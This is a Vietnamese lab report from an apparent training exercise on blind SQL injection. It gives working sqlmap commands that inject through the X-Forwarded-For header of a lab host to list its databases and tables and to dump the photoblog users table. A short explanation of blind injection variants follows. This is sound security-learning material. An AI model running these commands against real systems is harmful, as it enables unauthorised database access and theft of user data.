# Report lab 2 SQL Injection

Tương tự lab trước, thử nhập dấu ' vào trước 1 trên id

![image](https://user-images.githubusercontent.com/61901474/163430883-02d0ab17-0a11-4b6a-9ecc-70f5e6d2cd54.png)

-> không thấy hiện thông báo lỗi nào -> Blind SQL injection

-> Sử dụng sqlmap để tấn công

- Kiểm tra database có trong server
```
sqlmap -u "http://192.168.67.133/cat.php?id=1" --headers="X-forwarded-for:1*" --dbs
```
![image](https://user-images.githubusercontent.com/61901474/163430027-95784f6b-1401-4a5b-afbd-8199a745f132.png)


![image](https://user-images.githubusercontent.com/61901474/163430038-c0f5349c-6a2c-4372-83b9-d444385d051d.png)

- Kiểm tra các bảng của database photoblog
```
sqlmap -u "http://192.168.67.133/cat.php?id=1" --headers="X-forwarded-for:1*" --tables -D photoblog --smart --batch
```
![image](https://user-images.githubusercontent.com/61901474/163430062-2220d0dc-8ec2-43e9-841e-e2e5e3e92213.png)

![image](https://user-images.githubusercontent.com/61901474/163430078-6f6da365-d127-4ac3-9ddb-ce3186b8a72c.png)

- Xem dữ liệu của bảng users
```
sqlmap -u "http://192.168.67.133/cat.php?id=1" --headers="X-forwarded-for:1*" --dump -T users -D photoblog --smart --batch
```
![image](https://user-images.githubusercontent.com/61901474/163430093-0c7ad3ee-c878-42da-81a1-e87ea48e72cd.png)

![image](https://user-images.githubusercontent.com/61901474/163430101-0863ffdf-2080-46f0-872a-b8ee64b51b1a.png)

- Blind SQL injection: Blind SQL injection là một kiểu tấn công SQL injection truy vấn cơ sở dữ liệu sử dụng các mệnh đề để đoán biết. Cách tấn công này thường được sử dụng khi mà một ứng dụng (web, apps) được cấu hình để chỉ hiển thị những thông báo lỗi chung chung, không hiển thị ra lỗi của SQL. 

Có hai biến thể chính để thực hiện Blind SQL injection: Blind SQL injejction dựa vào nội dung phản hồi và Blind SQL injejction dựa vào độ trễ của thời gian phản hồi.
